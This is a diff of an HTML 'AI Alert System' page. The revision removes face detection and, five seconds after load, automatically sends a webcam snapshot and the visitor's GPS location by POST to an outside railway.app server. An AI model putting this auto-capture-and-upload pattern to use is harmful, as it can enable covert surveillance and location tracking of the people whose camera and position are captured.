@@ -1,124 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI Alert System</title>
-
-<style>
-body { margin:0; background:black; overflow:hidden; }
-video {
-  width:100vw;
-  height:100vh;
-  object-fit:cover;
-}
-#status {
-  position:fixed;
-  top:10px;
-  left:10px;
-  color:#00ff00;
-  font-family:monospace;
-  background:rgba(0,0,0,0.5);
-  padding:6px 10px;
-  border-radius:6px;
-}
-</style>
-
-<script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+  <title>AI Alert System</title>
 </head>
-
 <body>
 
-<div id="status">Starting...</div>
-<video id="video" autoplay muted playsinline></video>
+<h2>AI Alert System Running...</h2>
+
+<video id="video" autoplay playsinline width="300"></video>
 
 <script>
 const video = document.getElementById("video");
-const statusText = document.getElementById("status");
 
-// Camera start
+// Camera ON
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
   video.srcObject = stream;
-  statusText.innerText = "Camera ON";
-})
-.catch(err => {
-  statusText.innerText = "Camera Error";
 });
 
-let lastAlertTime = 0;
-
-// Load AI model
-async function loadModel() {
-  await faceapi.nets.tinyFaceDetector.loadFromUri(
-    "https://cdn.jsdelivr.net/npm/face-api.js/models"
-  );
-  statusText.innerText = "AI Ready";
-}
-
-// Start detection
-async function start() {
-  await loadModel();
-
-  setInterval(async () => {
-    if (!video.videoWidth) return;
-
-    const result = await faceapi.detectAllFaces(
-      video,
-      new faceapi.TinyFaceDetectorOptions()
-    );
-
-    if (result.length === 0) {
-      const now = Date.now();
-
-      if (now - lastAlertTime > 10000) {
-        statusText.innerText = "🚨 No Face!";
-        sendAlert();
-        lastAlertTime = now;
-      }
-    } else {
-      statusText.innerText = "Face Detected ✅";
-    }
-  }, 3000);
-}
-
-// Send alert
-function sendAlert() {
-  if (!video.videoWidth) return;
-
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
-
-  const image = canvas.toDataURL("image/png");
-
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      fetch("https://ai-alert-system-production.up.railway.app/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          image: image,
-          location: pos.coords.latitude + "," + pos.coords.longitude
-        })
-      });
-    }
-  );
-}
-
-// Start system
-start();
-
-// Auto test after 5 sec
+// After 5 sec → Capture + Send
 setTimeout(() => {
-  statusText.innerText = "⚡ Testing...";
-  sendAlert();
-}, 5000);
+  navigator.geolocation.getCurrentPosition(async (pos) => {
 
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    const image = canvas.toDataURL("image/png");
+    const location = pos.coords.latitude + "," + pos.coords.longitude;
+
+    await fetch("https://ai-alert-system-production.up.railway.app/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ image, location })
+    });
+
+    alert("🚨 Alert Sent!");
+  });
+}, 5000);
 </script>
 
 </body>
